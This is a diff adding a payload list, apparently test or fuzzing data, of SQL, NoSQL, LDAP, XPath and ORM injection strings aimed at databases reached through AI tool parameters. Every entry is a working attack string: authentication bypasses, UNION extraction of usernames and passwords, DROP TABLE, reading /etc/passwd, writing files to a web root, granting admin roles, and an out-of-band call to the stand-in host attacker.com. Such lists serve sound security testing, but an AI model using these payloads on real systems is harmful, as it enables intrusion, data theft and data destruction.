@@ -1,0 +1,93 @@
+# ============================================================================
+# SQL Injection via AI Tool Parameters
+# SQL injection payloads that might be passed through AI tools to databases
+# ============================================================================
+
+# Basic OR-based bypass
+' OR '1'='1
+# Union-based extraction
+' UNION SELECT username, password FROM users --
+# Comment-based termination
+admin' --
+# Double-dash comment
+' OR 1=1 --
+# Hash comment (MySQL)
+' OR 1=1 #
+# Semicolon with new query
+'; DROP TABLE users; --
+# String concatenation (MySQL)
+' OR 'a'='a
+# String concatenation (PostgreSQL)
+' || 'a' = 'a
+# Blind boolean-based
+' AND 1=1 --
+# Blind time-based (MySQL)
+' AND SLEEP(5) --
+# Blind time-based (PostgreSQL)
+' AND pg_sleep(5) --
+# Blind time-based (MSSQL)
+' WAITFOR DELAY '0:0:5' --
+# Error-based (MySQL)
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --
+# Error-based (PostgreSQL)
+' AND CAST((SELECT version()) AS INT) --
+# Stacked queries
+'; SELECT * FROM information_schema.tables; --
+# Out-of-band (MySQL)
+' UNION SELECT LOAD_FILE('/etc/passwd') --
+# Out-of-band DNS (MSSQL)
+'; EXEC master.dbo.xp_dirtree '\\attacker.com\share' --
+# Hex-encoded string
+' OR 0x61646D696E = username --
+# CHAR-based bypass
+' OR CHAR(97,100,109,105,110) = username --
+# URL-encoded
+%27%20OR%20%271%27%3D%271
+# Double-URL-encoded
+%2527%2520OR%2520%25271%2527%253D%25271
+# Unicode bypass
+' OR ＇1＇＝＇1
+# NULL byte
+admin'%00--
+# Inline comment bypass (MySQL)
+' /*!UNION*/ /*!SELECT*/ 1,2,3 --
+# Version comment bypass
+' /*!50000UNION*/ SELECT 1,2,3 --
+# Case manipulation
+' UnIoN SeLeCt 1,2,3 --
+# Double query encoding
+'%20UNION%20SELECT%201,2,3%20--
+# Whitespace alternatives (MySQL)
+'%09UNION%0ASELECT%0D1,2,3%20--
+# Parentheses bypass
+' AND(1=1)--
+# JSON extraction (PostgreSQL)
+' UNION SELECT json_agg(row_to_json(users)) FROM users --
+# XML extraction (MSSQL)
+' UNION SELECT * FROM users FOR XML AUTO --
+# NoSQL injection (MongoDB)
+{"$gt": ""}
+# NoSQL OR injection
+{"$or": [{"username": "admin"}, {"username": {"$regex": ".*"}}]}
+# NoSQL regex injection
+{"username": {"$regex": "^admin"}}
+# GraphQL injection
+{"query": "{ users { id username password } }"}
+# Batch query injection
+'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --
+# Privilege escalation
+'; UPDATE users SET role='admin' WHERE username='attacker'; --
+# Data exfiltration via OUTFILE
+' UNION SELECT 'data' INTO OUTFILE '/var/www/html/data.txt' --
+# Trigger creation
+'; CREATE TRIGGER exfil AFTER INSERT ON users FOR EACH ROW EXECUTE FUNCTION exfiltrate(); --
+# Stored procedure abuse
+'; EXEC sp_makewebtask 'C:\output.html', 'SELECT * FROM users'; --
+# Second-order injection — stored payload
+Register with username: admin'-- (the injection activates when the username is used in a later query)
+# LDAP injection
+*)(uid=*))(|(uid=*
+# XPath injection
+' or '1'='1
+# ORM injection (Sequelize)
+{"username": {"[Op.like]": "%"}}
